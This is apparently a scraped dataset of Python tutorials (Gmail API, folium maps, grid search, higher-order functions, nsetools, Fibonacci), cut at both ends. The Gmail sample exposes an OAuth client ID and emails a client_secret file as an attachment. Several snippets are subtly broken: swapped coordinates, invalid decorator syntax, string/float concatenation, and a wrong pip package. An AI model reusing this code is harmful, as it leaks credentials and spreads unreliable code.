or not creds.valid:', 'if creds and creds.expired and creds.refresh_token:', 'creds.refresh(Request())', 'else:', ""flow = InstalledAppFlow.from_client_secrets_file('client_secret_107196167488-dh4b2pmpivffe011kic4em9a4ugrcooi.apps.googleusercontent.com.json', SCOPES) # downloaded credential name"", 'creds = flow.run_local_server(port=0) # running credentials', '# save the credentials for the next run', 'with open(""token.pickle"", ""wb"") as token:', 'pickle.dump(creds, token)', ""return build('gmail', 'v1', credentials=creds) # using Gmail to authenticate"", '# Get the Gmail API service by calling the function', 'ServicesGA = authenticateGmailAPIs()', '# Using a default funnction to add attachments in Mail', 'def AddAttachment(mail, NameofFile):', 'content_type, encoding = guess_mime_type(NameofFile)', 'if content_type is None or encoding is not None: # defining none file type attachment', ""content_type = 'application/octet-stream'"", ""main_type, sub_type = content_type.split('/', 1)"", ""if main_type == 'text': # defining text file type attachment"", ""fp = open(NameofFile, 'rb') # opening file"", 'msg = MIMEText(fp.read().decode(), _subtype = sub_type)', 'fp.close()', ""elif main_type == 'image': # defining image file type attachment"", ""fp = open(NameofFile, 'rb')"", 'msg = MIMEImage(fp.read(), _subtype = sub_type)', 'fp.close()', ""elif main_type == 'audio': # defining audio file type attachment"", ""fp = open(NameofFile, 'rb')"", 'msg = MIMEAudio(fp.read(), _subtype = sub_type) # reading file', 'fp.close()', 'else:', ""fp = open(NameofFile, 'rb')"", 'msg = MIMEBase(main_type, sub_type)', 'msg.set_payload(fp.read())', 'fp.close() # closing file', 'NameofFile = os.path.basename(NameofFile)', ""msg.add_header('Content-Disposition', 'attachment', NameofFile = NameofFile)"", 'mail.attach(msg) # composing the mail with given attachment', '# Creating mail with a default function', ""def CreateMail(RecieverMail, SubofMail, BodyofMail, attachments=[]): # various import content of mail as function's parameter"", '# Using if else to check if there is any attachment in mail or not', 'if not attachments: # no attachment is given in the mail', 'mail = MIMEText(BodyofMail) # Body of Mail', ""mail['to'] = RecieverMail # mail ID of Reciever"", ""mail['from'] = OurEmailID # our mail ID"", ""mail['subject'] = SubofMail # Subject of Mail"", 'else: # attachment is given in the mail', 'mail = MIMEMultipart()', ""mail['to'] = RecieverMail"", ""mail['from'] = OurEmailID"", ""mail['subject'] = SubofMail"", 'mail.attach(MIMEText(BodyofMail))', 'for NameofFile in attachments:', 'AddAttachment(mail, NameofFile)', ""return {'raw': urlsafe_b64encode(mail.as_bytes()).decode()}"", '# Creating a default function to send a mail', 'def SendMail(ServicesGA, RecieverMail, SubofMail, BodyofMail, attachments=[]):', 'return ServicesGA.users().messages().send(', 'userId = ""me"",', 'body = CreateMail(RecieverMail, SubofMail, BodyofMail, attachments)', ').execute() # Body of the mail with execute() function', ""# Sending an email by adding important content, i.e., Reciever's mail, Subject, Body, etc."", 'SendMail(ServicesGA, ""Reciever@gmail.com"", ""Python Project i.e., This is the subject of Mail we are sendimg!"",', '""Now, this is the body of the email we are writing and we can add only written text here!"", [""test.txt"", ""client_secret_107196167488-dh4b2pmpivffe011kic4em9a4ugrcooi.apps.googleusercontent.com.json""]) # calling out default SendMail() function']",['Please visit this URL to authorize this application: https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=107196167488-dh4b2pmpivffe011kic4em9a4ugrcooi.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%3A55991%2F&scope=https%3A%2F%2Fmail.google.com%2F&state=kfXlNyjvbKetyUK0op7OF9WY7shrKS&access_type=offline'],[],"[""|||We should have a Python version higher or equal to 2.6.|||We must have a google account with Gmail service enabled of it.|||The system must be installed BeautifulSoup library (if not, then we should use 'pip install bsp' syntax in the command terminal to install it in our device).|||We should have basic knowledge of Google OAuth libraries and Google API client.||||||First, we choose the application type as the desktop application for the project.||||||After that, we enter the application name (can be the same as we have set in the above steps or can be different) and click on the create button.|||Now, the OAuth client ID will be created for our project, and we download it and save it with the 'credentials.json' name and format for future references.|||||||||Sending an email|||Searching an email|||Deleting an email or entire emails history|||Reading an email|||Marking read/unread an email etc.|||""]"
60,['How to Plot the Google Map using folium package in Python'],"['The folium package is built on the data wrangling strengths of the Python ecosystem and the mapping strengths of the Leaflet.js library of JavaScript language. The user can manipulate their data by using Python and then visualize it by using Leaflet.js map through folium package. Folium package is an easy approach of visualizing the data on Leaflet.js map, which has been manipulated by using Python.']","['https://www.javatpoint.com/grid-search-in-python', 'https://www.javatpoint.com/gmail-api-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/grid-search-in-python', 'https://www.javatpoint.com/gmail-api-in-python', 'https://www.javatpoint.com/grid-search-in-python']","['https://static.javatpoint.com/python/images/how-to-plot-the-google-map-using-folium-package-in-python.png', 'https://static.javatpoint.com/python/images/how-to-plot-the-google-map-using-folium-package-in-python2.png', 'https://static.javatpoint.com/python/images/how-to-plot-the-google-map-using-folium-package-in-python3.png', 'https://static.javatpoint.com/python/images/how-to-plot-the-google-map-using-folium-package-in-python4.png']",[],['Conclusion'],"['Required Module and Libraries', 'Step 1: Create the Base map', 'Step 2: Add a Circular Marker', 'Step 3: Add the simple marker for the parachute style marker with the popup text', 'Step 4: Add the line on the map']",[],"['Folium: The user can install the Folium package by using the following command.', 'After successful installation of the both libraries, we follow the below steps to plot Google map.', 'The user can create the base map by using the following program:', 'The user can mark the area with the circle and popup text by using the following code:', 'The user can use the following code.', 'The user can use the following code for adding the line on the map to join the two coordinates.', 'Explanation']","[""Geopy: The geopy module of Python makes it easy for Python users to locate the coordinates of landmarks, cities, countries on the earth's surface. For installing the geopy module, the user can use the following command:"", 'We used the geopy library to get the latitude and longitude of the location. Then we used the ""folium.map"" method of the folium package for creating the base of Google Maps.', 'In this tutorial, we have shown how the user can Plot the Google map and add different required functionalities on the map like a circular mark, parachute mark, pop-up text, and the line joining the two coordinates on the map.']","['In step 2, we used ""folium.CircleMarker"" for marking the circular mark on the location with the pop-up text. In step 3, we used ""folium.Marker"" to add a parachute style mark on the mentioned location. In the last step, we used ""folium.PolyLine"" for joining two marks on two different locations on the map.']","['pip install folium', 'pip install geopy', 'import os', '# First, import folium package', 'import folium', 'from geopy.geocoders import Nominatim as NT', '# Initialize Nominatim API', 'geo_locator = NT(user_agent = ""geoapiExercises"")', '# write the place', 'place_1 = ""Yemen""', 'location_1 = geo_locator.geocode(place_1)', '# now, it will search for the location by using the latitude and longitude, with zoom_start = 15', 'user_map1 = folium.Map(location = [location_1.longitude, location_1.latitude],', 'zoom_start = 15 )', '# At last, open the base map', 'user_map1', 'import folium', 'from geopy.geocoders import Nominatim as NT', 'geo_locator = NT(user_agent = ""geoapiExercises"")', 'place_1 = ""Yemen""', 'location_1 = geo_locator.geocode(place_1)', 'user_map1 = folium.Map(location = [location_1.longitude, location_1.latitude],', 'zoom_start = 15 )', '# CircleMarker with radius', 'folium.CircleMarker(location = [location_1.longitude, location_1.latitude],', ""radius = 45, popup = ' YEMEN ').add_to(user_map1)"", '# Now, open the Map with circular Mark', 'user_map1', 'import os', 'import folium', 'from geopy.geocoders import Nominatim as NT', 'geo_locator = NT(user_agent = ""geoapiExercises"")', 'place_1 = ""Yemen""', 'location_1 = geo_locator.geocode(place_1)', 'user_map1 = folium.Map(location = [location_1.longitude, location_1.latitude],', 'zoom_start = 15)', '#Now, we will pass the string in popup parameter', 'folium.Marker([location_1.longitude, location_1.latitude],', ""popup = ['YEMEN']).add_to(user_map1)"", '# now, open the map', 'user_map1', '# First, import folium package', 'import folium', 'import os', 'from geopy.geocoders import Nominatim as NT', 'geo_locator = NT(user_agent = ""geoapiExercises"")', 'place_1 = ""Aden""', 'place_2 = ""Yemen""', 'location_1 = geo_locator.geocode(place_1)', 'location_2 = geo_locator.geocode(place_2)', 'user_map1 = folium.Map(location = [location_1.longitude, location_1.latitude],', 'zoom_start = 6)', 'folium.Marker([location_1.longitude, location_1.latitude],', ""popup = ['Aden']).add_to(user_map1)"", 'folium.Marker([location_2.longitude, location_2.latitude],', ""popup = 'Yemen').add_to(user_map1)"", '# Now, we will add the line on the map by using Polyline method .', '# it will connect both coordinates by the line', 'folium.PolyLine(locations = [[location_1.longitude, location_1.latitude], [location_2.longitude, location_2.latitude]],', 'line_opacity = 0.5).add_to(user_map1)', '# now, open the map', 'user_map1']",[],[],[]
61,['Grid Search in Python'],"['In this tutorial, we will discuss the Grid Search for the purpose of hyperparameter tuning. We will also learn about the working of Grid Search along with the implementation of it in optimizing the performance of the method of Machine Learning (ML).']","['https://www.javatpoint.com/python-high-order-function', 'https://www.javatpoint.com/how-to-plot-the-google-map-using-folium-package-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/machine-learning', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/numpy-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-pandas', 'https://www.javatpoint.com/https://www.javatpoint.com/keras', 'https://www.javatpoint.com/python-high-order-function', 'https://www.javatpoint.com/how-to-plot-the-google-map-using-folium-package-in-python', 'https://www.javatpoint.com/python-high-order-function']",[],[],"['Understanding Grid Search', 'Installing the required libraries', 'Implementation of Grid Search in Python']","['Training the Model without Grid Search', 'Optimizing Hyper-parameters using Grid Search']","[""Note: If any issues arise while executing any package, try reinstalling and referring to each package's official documentation.""]","['So let us begin by understanding Grid Search.', 'Let us consider that the model accepts the below three parameters in the form of input:', 'These libraries and frameworks are as follows:', 'They are all quite simple to install. We can use the pip installer in order to install these libraries as shown below:', 'Now, let us begin implementing the Grid Search in Python', ""So, let's get started."", 'But before that, we have to import the required packages:', 'File: mygrid.py', 'Explanation:', 'File: mygrid.py', 'Explanation:', 'Now, let us divide the data into the feature and label sets in order to apply the standard scaling on the dataset.', 'The snippet of code for the same is shown below:', 'File: mygrid.py', 'Explanation:', 'Now, let us consider the following snippet of code in order to create a simple deep learning model.', 'File: mygrid.py', 'Explanation:', ""Now, we will understand how Grid Search makes the programmer's life easier by optimizing the parameters in the next section."", 'File: mygrid.py', 'Explanation:', 'As a result, the accuracy we got is 0.0000e+00.', 'First of all, we will try modifying the create_my_model() function in order to accept arguments from the calling function as shown below:', 'File: mygrid.py', 'Explanation:', 'Now, let us implement the algorithm for Grid Search and fit the dataset on it:', 'File: mygrid.py', 'Explanation:', 'The above output shows the parameter combination which yields the best accuracy.']","['Hyperparameter tuning is significant for the appropriate working of the models of Machine Learning (ML). A method like Grid Search appears to be a basic utility for hyperparameter optimization.', 'Before we start implementing the Grid Search in the Python programming language, let us briefly discuss some of the necessary libraries and frameworks that need to be installed in the system.', 'In the above snippet of code, we have imported the required packages and libraries necessary for the project. One can also save the program file and execute it in order to check if the libraries and packages are installed and imported properly.', 'Once the packages are imported successfully, we have to use the following snippet of code in order to import the dataset and print the first five rows of it.', 'In the above snippet of code, we have imported the dataset using the read_csv() of the pandas library and stored it within the mydf variable. We have then printed the first five rows using the head() function along with the mydf variable.', 'In the snippet of code shown below, we will create a model with the help of parameter values that we decided on randomly or based on our intuition and see how our model performs:', 'In the above snippet of code, we have made some changes to the previous create_my_model function and used the KerasClassifier to create the model object.']","['The Grid Search Method considers some hyperparameter combinations and selects the one returning a lower error score. This method is specifically useful when there are only some hyperparameters in order to optimize. However, it is outperformed by other weighted-random search methods when the Machine Learning model grows in complexity.', ""Grid Search is an optimization algorithm that allows us to select the best parameters to optimize the issue from a list of parameter choices we are providing, thus automating the 'trial-and-error' method. Although we can apply it to multiple optimization issues; however, it is most commonly known for its utilization in machine learning in order to obtain the parameters at which the model provides the best accuracy."", 'If we want to try out two options for every parameter input (as specified in square brackets above), it estimates different combinations. For instance, one possible combination can be [2, 5, 10]. Finding such combinations manually would be a headache.', ""Now, suppose that we had ten different parameters as input, and we would like to try out five possible values for each and every parameter. It would need manual input from the programmer's end every time we like to alter the value of a parameter, re-execute the code, and keep a record of the outputs for every combination of the parameters."", 'Grid Search automates that process, as it accepts the possible value for every parameter and executes the code in order to try out each and every possible combination outputs the result for the combinations and outputs the combination having the best accuracy.', 'In the following section, we will understand how to implement Grid Search on an actual application. We will simply be executing the code and discuss in-depth regarding the section where Grid Search comes in rather than discussing Machine Learning and Data Pre-processing section.', 'We will use the Diet Dataset containing data regarding the height and weight of different people based on various attributes such as gender, age, and type of diet. We can directly import the data from an online resource with the help of the Pandas read_csv() function.', 'In the above snippet of code, we have converted the pandas dataframe into a NumPy array. We have then imported the StandardScaler module from the sklearn library and use the function to normalize the data. We have then transformed and displayed the training data using the transform() function.', 'The following snippet of code has defined a function as create_my_model() accepting two parameters, i.e., learnRate and dropoutRate, respectively. We have then created the model as mymodel using the Sequential() function. We have also used the add() along with the Dense() and Dropout() function. We have then compiled the model using the compile() function.', ""As a result, when we execute the code, this will lead to loading the dataset, preprocessing it, and creating a machine learning model. Since we are only interested in understanding the working of Grid Search, we haven't performed the train/test split, and we had fitted the model on the complete dataset."", 'In the above snippet of code, we have declared the values of the parameter, i.e., dropoutRate, epochs, batchSize, and learnRate, respectively. We have then created the model object by calling the create_my_model() function. We have then fitted the model onto the training data.', 'If we are not using the Grid Search method, we can directly call the fit() function on the model we have created above. But in order to utilize the Grid Search method, we have to pass in few arguments to the create_my_model() function. Moreover, we have to declare the grid with various options to try for every parameter. Let us perform that in different parts.', ""At last, we can conclude that the Grid Search is quite easy to implement in the Python programming language and saved us a lot of time in human labor. We can list down all the arguments we wanted to tune, declare the values that need to be tested, execute the code, and forget about it. The process is so easy and convenient that it requires less input from the programmer's side. Once the best argument combination has been found, we can utilize that for the final model.""]","['$ pip install numpy tensorflow pandas scikit-learn keras', 'import sys', 'import pandas as pd', 'import numpy as np', 'from sklearn.model_selection import GridSearchCV, KFold', 'from keras.models import Sequential', 'from keras.layers import Dense, Dropout', 'from keras.wrappers.scikit_learn import KerasClassifier', 'from keras.optimizers import Adam', '# importing the dataset', 'mydf = pd.read_csv(""Diet_Dataset.csv"")', '# printing the first five lines of dataset', 'print(mydf.head())', '# converting dataframe into numpy array', 'mydataset = mydf.values', 'X = mydataset[:, 0:6]', 'Y = mydataset[:, 6].astype(int)', '# Normalizing the data using sklearn StandardScaler', 'from sklearn.preprocessing import StandardScaler', 'myscaler = StandardScaler().fit(X)', '# Transforming and displaying the training data', 'X_stdized = myscaler.transform(X)', 'mydata = pd.DataFrame(X_stdized)', '# defining the function to create model', 'def create_my_model(learnRate, dropoutRate):', '# Creating model', 'mymodel = Sequential()', ""mymodel.add(Dense(6, input_dim = 6, kernel_initializer = 'normal', activation = 'relu'))"", 'mymodel.add(Dropout(dropoutRate))', ""mymodel.add(Dense(3, input_dim = 6, kernel_initializer = 'normal', activation = 'relu'))"", 'mymodel.add(Dropout(dropoutRate))', ""mymodel.add(Dense(1, activation = 'sigmoid'))"", '# Compiling the model', 'my_Adam = Adam(learning_rate = learnRate)', ""mymodel.compile(loss = 'binary_crossentropy', optimizer = my_Adam, metrics = ['accuracy'])"", 'return mymodel', '# Declaring the values of the parameter', 'dropoutRate = 0.1', 'epochs = 1', 'batchSize = 20', 'learnRate = 0.001', '# Creating the model object by calling the create_my_model function we created above', 'mymodel = create_my_model(learnRate, dropoutRate)', '# Fitting the model onto the training data', 'mymodel.fit(X_stdized, Y, batch_size = batchSize, epochs = epochs, verbose = 1)', 'def create_my_model(learnRate, dropoutRate):', '# Creating the model', 'mymodel = Sequential()', ""mymodel.add(Dense(6, input_dim = 6, kernel_initializer = 'normal', activation = 'relu'))"", 'mymodel.add(Dropout(dropoutRate))', ""mymodel.add(Dense(3, input_dim = 6, kernel_initializer = 'normal', activation = 'relu'))"", 'mymodel.add(Dropout(dropoutRate))', ""mymodel.add(Dense(1, activation = 'sigmoid'))"", '# Compile the model', 'myadam = Adam(learning_rate = learnRate)', ""mymodel.compile(loss = 'binary_crossentropy', optimizer = myadam, metrics = ['accuracy'])"", 'return mymodel', '# Creating the model object', 'mymodel = KerasClassifier(build_fn = create_my_model, verbose = 1)', '# Defining the arguments that we want to use in Grid Search along', '# with the list of values that we want to try out', 'learnRate = [0.001, 0.02, 0.2]', 'dropoutRate = [0.0, 0.2, 0.4]', 'batchSize = [10, 20, 30]', 'epochs = [1, 5, 10]', '# Making a dictionary of the grid search parameters', 'paramgrid = dict(learnRate = learnRate, dropoutRate = dropoutRate, batch_size = batchSize, epochs = epochs )', '# Building and fitting the GridSearchCV', 'mygrid = GridSearchCV(estimator = mymodel, param_grid = paramgrid, cv = KFold(random_state = None), verbose = 10)', 'gridresults = mygrid.fit(X_stdized, Y)', '# Summarizing the results in a readable format', 'print(""Best: "" + gridresults.best_score_ + "" using "" + gridresults.best_params_)', ""means = gridresults.cv_results_['mean_test_score']"", ""stds = gridresults.cv_results_['std_test_score']"", ""params = gridresults.cv_results_['params']"", 'for mean, stdev, param in zip(means, stds, params):', 'print(mean + ""("" + stdev + "")"" + "" with: "" + param)']","['Person gender  Age  Height  pre.weight  Diet  weight6weeks', '0      25          41     171          60     2          60.0', '1      26          32     174         103     2         103.0', '2       1      0   22     159          58     1          54.2', '3       2      0   46     192          60     1          54.0', '4       3      0   55     170          64     1          63.3', '4/4 [==============================] - 41s 14ms/step - loss: 0.9364 - accuracy: 0.0000e+00', 'Best: 0.00347268912077, using {batch_size=10, dropoutRate=0.4, epochs=5, learnRate=0.2}']",[],"['|||Number of hidden layers [2, 4]|||Number of neurons in every layer [5, 10]|||Number of epochs [10, 50]||||||Python 3|||NumPy|||Pandas|||Keras|||Scikit-Learn|||']"
62,['Python High Order Function'],"['As we must be aware of the basic concept of Python functions, we should move forward with some advanced concepts related to Python functions. In this tutorial, we are going to discuss the important aspects of High order functions in Python, like what high order functions are, how we can define them in Python, how we can use them in Python and what the properties of high order functions are.']","['https://www.javatpoint.com/assignment-operators-in-python', 'https://www.javatpoint.com/grid-search-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-functions', 'https://www.javatpoint.com/https://www.javatpoint.com/python-decorator', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/assignment-operators-in-python', 'https://www.javatpoint.com/grid-search-in-python', 'https://www.javatpoint.com/assignment-operators-in-python']",[],[],"['High order functions', 'High order functions in Python']","['Prerequisites:', 'Properties of High order functions in Python', 'Method 1: Using functions as objects in High order function', 'Method 2: Functions as a parameter for another function', 'Method 3: Returning function as a result in high order function', 'Method 4: Decorators as high order function']",[],"['To learn about high order functions in Python, we must have basic knowledge of the following concepts:', ""First, let's start with the first thing, i.e., High order functions, and understand a basic about them."", 'Now, in this section, we will discuss some of the important properties of high order functions that are applicable in Python as well.', 'Following are the ways to define High order functions in a Python code that we are going to discuss in this tutorial.', 'Now, we will discuss each of the above-given methods in detail and learn about their implementation as high order functions in a Python program.', 'Look at the following example program to learn the implementation of method we discussed above:', 'Look at the following program to understand the implementation of above-given method:', 'We can also return a function as the result of another function as an object, and that makes the function a high order function.', 'Look at the following example program to learn the implementation of method we discussed above:', 'The above syntax for the decorator is equivalent to the following Python code for a high order function.', 'Look at the following program to understand the implementation of above given method:']","['A function that is having another function as an argument or a function that returns another function as a return in the output is called the High order function. High order functions operate with other functions given in the program.', 'Now, in this section, we will talk specifically about the Python high order functions and how we can define them. We will discuss the methods and means by which we will define and use high order functions in our Python program.', 'Basically, Python functions are like Python objects, and therefore we can use Python functions to pass them as an argument inside another function, and that will create a high order function in the program.', 'In Python decorators, a function is taken as an argument for the other function, and then these decorators are called inside the wrapped function. Look at the following exemplar syntax for a decorator defined in a Python program.', 'We have referred @JTP_Decorator as a callable function inside the default Python_Decorator() function in the above-given code. We will have to add just some extra code in this structure, and we will get the output as the wrapper function.']","['A fact about the High order function is that a high order function is applicable to both functions as well as to the methods that take a function as their parameter or return a function as the result of them. In Python, this concept of high-order functions is supported with every aspect.', 'In Python, we can even assign a given function to a variable also. This assignment of function into variable will not call the actual function, instead of it will create a reference to the function that is created. Thus, it makes this assignment of assigning a function as a variable object will create a high order function in the program.', 'We can use decorators as the high order function as the most commonly used high order function in Python. Decorators in Python allow us to modify the behavior of methods or functions we defined in the program, and it also allows us to wrap a function inside another function to extend the behavior of wrapped or parent function. We can even wrap a function inside another function without even permanently modifying the parent function.']","['# a default function to take another function parameter', 'def spell(text):', '# Making text in upper', 'return text.upper()', '# Taking text as user input', 'text = input(""Enter a text to print it in uppercase and double: "")', '# Spell function with text', 'print(spell(text))', '# Assigning variable with the default function', 'scream = spell', '# Scream with text variable', 'print(scream(text))', '# Default function for making text uppercase', 'def scream(word):', 'return word.upper()', '# Default function for making text lowercase', 'def spell(word):', 'return word.lower()', '# A third function that work as a high order function', 'def speak(funct):', '# Storing the function in a variable in high order function', 'speaking = funct(""Hello Python Developers! You are welcomed to JavaTpoint"")', 'print(speaking)', '# Printing text in uppercase', 'speak(scream)', '# Printing text in lowercase', 'speak(spell)', '# A default function for addition', 'def Adding(a):', '# Nested function with second number', 'def Addition(b):', 'return a + b # addition of two numbers', 'return Addition # Result', '# Taking both number variable as user input', 'a = int(input(""Enter First Number: ""))', 'b = int(input(""Enter Second Number: ""))', '# Assigning nested adding function to a variable', 'AddVariable = Adding(a)', '# Using variable as high order function', 'Result = AddVariable(b)', '# Printing result', 'print(""Sum of Two numbers given by you is: "", Result)', '# Using a decorator', '@JTP_Decorator', 'def Python_Decorator():', '# Using Python default function as Python decorators', 'def Python_Decorator():', 'Python_Decorator = @JTP_Decorator(Python_Decorator)', '# Using default function as Python decorators', 'def Python_Decorator(funct):', '# Inner nested function', 'def inner():', 'print(""This line of code will be printed before the execution of high order function"")', 'funct()', 'print(""This line of code will be printed after the execution of high order function"")', 'return inner', '# A default function as decorator', 'def JTP_Decorator():', 'print(""This line of code will be printed inside the execution of high order function"")', 'JTP_Decorator = Python_Decorator(JTP_Decorator) # Python decorator as high order function', '# Python decorator calling out as high order function', 'JTP_Decorator()']","['Enter a text to print it in uppercase and double: JavaTPoint', 'JAVATPOINT', 'JAVATPOINT', 'HELLO PYTHON DEVELOPERS! YOU ARE WELCOMED TO JAVATPOINT', 'hello python developers! you are welcomed to javatpoint', 'Enter First Number: 24', 'Enter Second Number: 26', 'Sum of Two numbers given by you is:  50', 'This line of code will be printed before the execution of high order function', 'This line of code will be printed inside the execution of high order function', 'This line of code will be printed after the execution of high order function']",[],"['|||Python functions|||Parameters|||Python objects|||Python decorators||||||In high order function, we can store a function inside a variable.|||In high order function, a function can act as an instant of an object type.|||In high order function, we can return a function as a result of another function.|||In high order function, we can pass a function as a parameter or argument inside another function.|||We can store Python high order functions in data structures format such as lists, hash tables, etc.|||&&&|||Using functions as objects in High order function|||Returning function as a result in high order function|||Functions as a parameter for another function|||Decorators as high order function|||']"
63,['nsetools in Python'],"['In the following tutorial, we will discuss the nsetools library in the Python programming language. We will understand its features and work with some examples.']","['https://www.javatpoint.com/python-program-to-find-the-nth-fibonacci-number', 'https://www.javatpoint.com/what-is-operator-overloading-in-python', 'https://www.javatpoint.com/http://www.nseindia.com', 'https://www.javatpoint.com/python-program-to-find-the-nth-fibonacci-number', 'https://www.javatpoint.com/what-is-operator-overloading-in-python', 'https://www.javatpoint.com/python-program-to-find-the-nth-fibonacci-number']",[],[],"['Understanding the nsetools library', 'Main features of the Python nsetools library', 'How to install the Python nsetools library?', 'Creating an NSE object', 'Getting Information using the nsetools library']","['Updating the library', 'Python 3 support']",[],"[""So, let's get started."", 'Some of the key features of the Python nsetools library are stated as follows:', 'If some of us already have installed the nsetools library in their systems, then the following command will allow them to update the library.', 'We can create an NSE object using the Nse() function offered by the nsetools library. The same can be seen in the following example:', 'Explanation:', 'Let us consider an example demonstrating the use of nsetools for gathering Information.', 'Explanation:']","['NSE or National Stock Exchange of India Limited is the leading stock exchange of India, situated in Mumbai, Maharashtra. NSE was established in the year 1992 as the first dematerialized electronic exchange in the country.', 'Python 3 support for the library has been included from version 1.0.0 and so on. Now, this library is able to work for both Python 2 as well as Python 3.', 'In the above snippet of code, we have imported the required function from the library. We have then defined a variable that uses the Nse() function to create an NSE object. We have then printed the value of the variable for the users.']","['Python offers a library that allows the programmers to collect real-time data from National Stock Exchange (India). This library is known as nsetools. We can use this library in different projects, which requires fetching live quotes for a provided index or stock or creating large sets of data for further data analytics. We can also create Command-Line Interface (CLI) Applications that may deliver us the details of the live market at a blazing fast speed, pretty faster than any web browser. The data accuracy is only as correct as provided on the official website of the National Stock Exchange of India Limited. (http://www.nseindia.com)', 'The installation part of the nsetools library is quite easy, and it has no external dependencies. All the dependencies of the library are part of standard distribution packages of Python. We can install the nsetools library using the pip installer as shown in the following syntax:', 'In the above snippet of code, we have imported the required module and created an NSE object using the Nse() function. We have then defined another variable that uses the get_quote() function on the NSE object to get the quotation of the specified company. We have then printed the required details for the users.']","['$ pip install nsetools', '$ pip install nsetools -upgrade', '# importing the Nse() function from the nsetools library', 'from nsetools import Nse', '# creating an NSE object', 'nse_obj = Nse()', '# printing the value of the object', 'print(""NSE Object:"", nse_obj)', '# importing the Nse() function from the nsetools library', 'from nsetools import Nse', '# creating an NSE object', 'nse_obj = Nse()', '# getting quotation of the company', ""the_quotation = nse_obj.get_quote('sbin')"", '# printing the name of the company', 'print(the_quotation[""companyName""])', '# printing average price', 'print(""Average Price: "" + str(the_quotation[""averagePrice""]))']","['NSE Object: Driver Class for National Stock Exchange (NSE)', 'State Bank of India', 'Average Price: 431.97']",[],"['|||The nsetools library works out of the box, without any setup requirement.|||This library helps programmers to fetch livestock code and index codes at blazing fast speed.|||It also offers a set of all stocks and indices traded on the National Stock Exchange.|||Moreover, it also provides a set of:||||||Top losers|||Top gainers|||Most active|||||||||It also delivers several helpful Application Programming Interfaces (APIs) in order to validate a stock code and index code.|||The library optionally returns data in JSON format.|||It has a hundred per cent Unit test coverage.|||']"
64,['Python program to find the nth Fibonacci Number'],"['In the following tutorial, we will understand how to find the nth Fibonacci Number using Python. We can define a Fibonacci Number, where the following number is the sum of the preceding two numbers.']","['https://www.javatpoint.com/python-opencv-object-detection', 'https://www.javatpoint.com/nsetools-in-python', 'https://www.javatpoint.com/python-opencv-object-detection', 'https://www.javatpoint.com/nsetools-in-python', 'https://www.javatpoint.com/python-opencv-object-detection']",[],[],"['Finding nth Fibonacci Number using Recursion', 'Finding the nth Fibonacci Number using Dynamic Programming', 'Finding the nth Fibonacci Number using Dynamic Programming and Space Optimization', 'Finding the nth Fibonacci Number using Array']",[],[],"['The recurrence relation defines a Fibonacci number as shown below:', 'Fn = Fn - 1 + Fn - 2', 'There are different ways to find the nth Fibonacci Number using the Python programming language. Some of them are as follows:', 'Of these ways, the two most fundamental are the Recursion method and the Dynamic method.', 'Let us understand the working of these methods in detail with examples.', 'Let us consider the following snippet of code for better understanding.', 'Explanation:', 'In the above snippet of code, we have defined a function as Fibonacci_Series() that accepts a parameter as n.', 'Let us consider the following example to understand the same.', 'Explanation:', 'Let us consider the following example to understand the same.', 'Explanation:', 'In this method, we create an array of size x by repeated addition using the for-loop. Hence, the nth Fibonacci Number is returned.', 'Let us consider the following example to understand the same.', 'Explanation:']","['The term recursion is used to define something within itself. In a programming language like Python, Recursion refers to the process of a function calling itself. With the proper and correct code, the Recursion will create a finite loop.', 'This method is almost completely identical to Dynamic Programming. However, dynamic programming utilizes recursion to accomplish recurring addition, whereas this method utilizes the for-loop.']","['The first two elements of the Fibonacci series are 0 and 1, respectively. We can calculate the third element of the series by adding the preceding two elements and will get the third term as 0 + 1, which is equal to 1. Similarly, the fourth term will be the sum of the second and third terms, which is 1 + 1 = 2 and so on. The series of such numbers is known as a Fibonacci Series.', 'Moreover, we are aware that the first two elements of the Fibonacci are 0 and 1. In the event of the input as n = 1 or n = 2 (First or Second terms of Fibonacci series), we have used the if-else conditional statement to return 0 or 1. In case the value of n is greater than 2, the function will call itself with a lower input value. As we can observe that the code returns (Fibonacci_Series(n - 1) + Fibonacci_Series(n - 2)). Here, the function calls itself with a lower value unless it reaches the base value of n = 1 and n = 2, and as we know from before, n = 1 returns 0 and n = 2 returns 1. The returned values are then continuously added to produce the sequence of the Fibonacci Series.', 'Dynamic Programming utilizes Recursion as well; however, it mainly utilizes if-else conditional statements. Within the statements, the value of the Fibonacci number is stored in a variable. With the help of Recursion, the repeated addition allows us to obtain this Fibonacci number.', ""In the above snippet of code, we defined the function as Fibonacci_series(), which accepts the parameter as variable x. We created a one-dimensional array as fib_Array with data elements 0 and 1 in its zeroth and first indices. Then, if the provided input ('x') is less than or equal to 2, which is also the length of the array fib_Array, it returns 0 as the first number for x = 1 and 1 as the second number for x = 2. If the value of x is greater than 2, we have used recursion to call and insert the preceding two data elements. However, rather than returning the nth Fibonacci number directly, we append each of the summated elements to the fib_Array array. At last, we have returned the last element of the array (i.e., the nth element) and printed the value for the users."", 'In the above snippet of code, we have defined a function and assigned two variables, m = 0 and n = 1. These elements are the first and second elements of the Fibonacci Series. We have then used the if-elif-else conditional statements where the program returns 0 for input value x = 1 and 1 for input value x = 2. If the value of x is greater than 2, we have used the for-loop of i in the range (2, x + 1). We have taken a variable o to store the sum of the preceding two elements in the series. Once o takes the value of m + n, the value of m is reassigned to n. Subsequently, the value of n is reassigned to the value of o. This process continues, and value 3 keeps reassigning until the loop terminates. Once the loop is terminated, the function returns the value of n, which stores the value of the nth Fibonacci Number.', 'In the above snippet of code, we have defined the function. Within the function, we have created an array to find the nth element of the Fibonacci Series. We have then used the for-loop to add elements of the series to the array by repeating the addition of the preceding two elements. At last, the nth element is returned and printed for the users.']","['# defining the function for Fibonacci Series', 'def Fibonacci_Series(n):', '# using if-else conditional statement', 'if n < 0:', 'print(""Oops! Incorrect input"")', '# First Fibonacci number is 0', 'elif n == 0:', 'return (0)', '# Second Fibonacci number is 1', 'elif n == 1:', 'return (1)', 'else:', 'return (Fibonacci_Series(n - 1) + Fibonacci_Series(n - 2))', '# printing the 12th element of the Fibonacci Series', 'print(""12th Element of the Fibonacci 